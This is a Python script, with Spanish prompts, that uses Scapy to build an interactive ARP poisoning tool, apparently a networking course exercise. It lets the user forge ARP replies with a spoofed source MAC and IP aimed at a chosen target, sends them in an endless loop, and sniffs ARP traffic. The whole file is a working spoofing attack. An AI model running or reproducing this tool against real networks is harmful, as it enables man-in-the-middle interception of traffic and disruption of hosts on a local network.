import sys
from scapy.all import ARP, Ether, ICMP, IP, sendp, sniff


def par(arpPac):
    print("Esta es la funcion parametros")
    print(arpPac[0].show())
    return arpPac


'''
def tv(arpPac):
    print("Esta es la funcion tiempo de vida")
    del (arpPac.ttl)
    arpPac.ttl = 257
    while arpPac.ttl < 0 or arpPac.ttl > 255:
        arpPac.ttl = int(input("Escribe el tiempo de vida del paquete: "))
        if arpPac.ttl < 0 or arpPac.ttl > 255:
            print("El valor del tiempo de vida debe estar comprendido entre 0 y 255, ambos inclusive")
    print("El tiempo de vida del paquete es ", arpPac.ttl)
    return arpPac
'''


def ms(arpPac):
    print("Esta es la funcion mac spoofeada")
    compr = False
    while compr == False:
        mo = input("Escriba la direccion MAC spoofeada: ")
        n = mo.split(":")
        if len(n) == 6:
            for i in range(6):
                n[i] = int(n[i],16)
            if n[0] >= 0 and n[0] <= 255:
                if n[1] >= 0 and n[1] <= 255:
                    if n[2] >= 0 and n[2] <= 255:
                        if n[3] >= 0 and n[3] <= 255:
                            if n[4] >= 0 and n[4] <= 255:
                                if n[5] >= 0 and n[5] <= 255:
                                    compr = True
        else:
            print("La dirección MAC debe de tener 6 bytes")
        if compr == True:
            arpPac[Ether].src = mo
            arpPac[ARP].hwsrc = mo
            return arpPac

def ips(arpPac):
    print("Esta es la funcion ip spoofeada")
    compr = False
    while compr == False:
        ips = input("Escriba la direccion IPv4 spoofeada: ")
        n = ips.split(".")
        if len(n) == 4:
            for i in range(4):
                n[i] = int(n[i])
                print(n[i])
            if n[0] >= 0 and n[0] <= 255:
                if n[1] >= 0 and n[1] <= 255:
                    if n[2] >= 0 and n[2] <= 255:
                        if n[3] >= 0 and n[3] <= 255:
                            compr = True
        else:
            print("La dirección IP debe de tener 4 bytes")
        if compr == True:
            arpPac[ARP].psrc = ips
            return arpPac


def md(arpPac):
    print("Esta es la funcion mac de destino")
    compr = False
    while compr == False:
        md = input("Escriba la direccion MAC de destino: ")
        n = md.split(":")
        if len(n) == 6:
            for i in range(6):
                n[i] = int(n[i], 16)
            if n[0] >= 0 and n[0] <= 255:
                if n[1] >= 0 and n[1] <= 255:
                    if n[2] >= 0 and n[2] <= 255:
                        if n[3] >= 0 and n[3] <= 255:
                            if n[4] >= 0 and n[4] <= 255:
                                if n[5] >= 0 and n[5] <= 255:
                                    compr = True
        else:
            print("La dirección MAC debe de tener 6 bytes")
        if compr == True:
            arpPac[Ether].dst = md
            arpPac[ARP].hwdst = md
            return arpPac


def ipd(arpPac):
    print("Esta es la funcion ip de destino")
    compr = False
    while compr == False:
        ipd = input("Escriba la direccion IPv4 de destino: ")
        n = ipd.split(".")
        if len(n) == 4:
            for i in range(4):
                n[i] = int(n[i])
            if n[0] >= 0 and n[0] <= 255:
                if n[1] >= 0 and n[1] <= 255:
                    if n[2] >= 0 and n[2] <= 255:
                        if n[3] >= 0 and n[3] <= 255:
                            compr = True
        else:
            print("La dirección IP debe de tener 4 bytes")
        if compr == True:
            arpPac[ARP].pdst = ipd
            return arpPac


def sarp():
    print("Esta es la funcion escaneo arp")
    log = sniff(filter="arp")
    print(log.summary())


def sicmp(arpPac):
    print("Esta es la funcion escaneo icmp")
    return arpPac


# Funcion MAIN
print("Esto es el programa de envenenamiento de ARP de PAR")
arpPac = Ether() / ARP(op=2)
print("Se ha generado un paquete de respuesta ARP")
opcion = 1
while opcion != 0:
    opcion = int(input(
        "Indique la opción que desee realizar\n1: Consulta de parametros\n2: Establecer el tiempo de vida del paquete\n3: Dirección MAC a spoofear\n4: Direccion IP a spoofear\n5: Direccion MAC de destino\n6: Direccion IP de destino\n7: Mandar el paquete\n8: Escaneo de ARP\n9: Escaneo de ICMP\n0: Finalizar programa\nOpcion: "))
    if opcion == 1:
        arpPac = par(arpPac)
    elif opcion == 2:
        print("No hay tiempo de vida en los paquetes ARP")
        # arpPac = tv(arpPac)
    elif opcion == 3:
        arpPac = ms(arpPac)
    elif opcion == 4:
        arpPac = ips(arpPac)
    elif opcion == 5:
        arpPac = md(arpPac)
    elif opcion == 6:
        arpPac = ipd(arpPac)
    elif opcion == 7:
        while True:
            sendp(arpPac)
            #print(arpPac[0].show())
            print("El paquete ARP ha sido enviado")
    elif opcion == 8:
        sarp()
    elif opcion == 9:
        arpPac = sicmp(arpPac)
    elif opcion == 0:
        print("El programa ha finalizado")
    else:
        print("La opcion elegida no es correcta")
